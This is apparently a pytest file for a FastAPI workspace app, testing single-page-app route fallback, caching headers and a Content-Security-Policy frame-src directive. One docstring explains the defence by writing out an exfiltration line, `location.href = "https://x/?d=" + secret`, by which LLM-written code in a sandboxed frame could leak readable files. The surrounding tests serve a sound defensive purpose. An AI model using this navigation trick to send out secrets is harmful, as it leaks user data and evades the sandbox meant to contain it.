"""SPA history fallback — refreshing a client-side route like
/a/{slug}/items/{id} must serve index.html, not a 404.
"""

from __future__ import annotations

from collections.abc import AsyncIterator
from pathlib import Path

from fastapi.testclient import TestClient

from workspace_app.agent.context import AgentToolContext
from workspace_app.api import create_app
from workspace_app.api.events import AgentEvent
from workspace_app.filestore.memory import MemoryFileStore
from workspace_app.resources import make_spec
from workspace_app.sandbox.mock import MockSandbox


class _Runner:
    async def run(self, prompt: str, ctx: AgentToolContext) -> AsyncIterator[AgentEvent]:
        if False:
            yield  # pragma: no cover


def _client(tmp_path: Path) -> TestClient:
    (tmp_path / "index.html").write_text("<!doctype html><div id=root>RCA SPA</div>")
    (tmp_path / "assets").mkdir()
    (tmp_path / "assets" / "app.js").write_text("console.log('app')")
    spec = make_spec(default_user="u")
    app = create_app(
        spec=spec,
        sandbox=MockSandbox(),
        filestore=MemoryFileStore(),
        runner=_Runner(),
        spa_dist=tmp_path,
    )
    return TestClient(app)


def test_root_serves_index(tmp_path: Path):
    resp = _client(tmp_path).get("/")
    assert resp.status_code == 200
    assert "RCA SPA" in resp.text


def test_deep_client_route_falls_back_to_index(tmp_path: Path):
    """Refreshing a client route boots the SPA (index.html), not a 404."""
    resp = _client(tmp_path).get("/a/rca/items/abc-123")
    assert resp.status_code == 200
    assert "RCA SPA" in resp.text


def test_real_asset_is_served_directly(tmp_path: Path):
    resp = _client(tmp_path).get("/assets/app.js")
    assert resp.status_code == 200
    assert "console.log" in resp.text


def test_index_is_served_no_cache(tmp_path: Path):
    """index.html must always be revalidated so a rebuild's new hashed-asset
    references are picked up — both at `/` and via the history fallback."""
    client = _client(tmp_path)
    assert client.get("/").headers.get("cache-control") == "no-cache"
    fallback = client.get("/a/rca/items/abc-123")
    assert fallback.headers.get("cache-control") == "no-cache"


def test_hashed_asset_is_not_no_cache(tmp_path: Path):
    """Real (hashed) assets stay cacheable — only index.html is no-cache."""
    resp = _client(tmp_path).get("/assets/app.js")
    assert resp.headers.get("cache-control") != "no-cache"


def test_index_declares_frame_src_so_a_child_frame_cannot_navigate_away(tmp_path: Path):
    """A WUI runs LLM-written code in a sandboxed frame with its own
    `default-src 'none'`. That stops it fetching, but CSP has no directive a
    document can use to stop ITSELF navigating — `navigate-to` was dropped and
    never shipped — so `location.href = "https://x/?d=" + secret` walked
    everything `readFile` can reach straight out, measured in Chromium.

    A child frame's navigation is governed by the CONTAINING document's
    `frame-src`, which is why this belongs here and not in the frame. One
    directive only: it restricts nothing else on the page."""
    client = _client(tmp_path)
    for path in ("/", "/a/rca/items/abc-123"):  # direct and via the history fallback
        csp = client.get(path).headers.get("content-security-policy")
        assert csp is not None, path
        assert "frame-src" in csp


def test_frame_src_still_admits_the_frames_the_app_itself_uses(tmp_path: Path):
    """Every iframe the app mounts is same-origin (a PDF preview, a KB blob) or
    `srcdoc`. A policy that locked those out would trade an exfiltration hole
    for a blank document viewer."""
    csp = _client(tmp_path).get("/").headers["content-security-policy"]
    frame_src = next(d for d in csp.split(";") if d.strip().startswith("frame-src"))
    assert "'self'" in frame_src
    assert "blob:" in frame_src


def test_unknown_api_route_still_404s_json(tmp_path: Path):
    """An /api/* path that matches NO route falls through to the SPA mount, but
    the `api/` guard makes it 404 rather than serving index.html (#177) — an API
    miss must stay an API miss, never a masked SPA page."""
    resp = _client(tmp_path).get("/api/__no_such_route__")
    assert resp.status_code == 404
    assert "text/html" not in resp.headers.get("content-type", "")


def test_non_get_to_spa_path_is_not_rewritten(tmp_path: Path):
    """Only 404s fall back to index.html — other static errors (e.g. a
    405 for a non-GET method) propagate unchanged."""
    resp = _client(tmp_path).post("/a/rca/items/abc")
    assert resp.status_code == 405
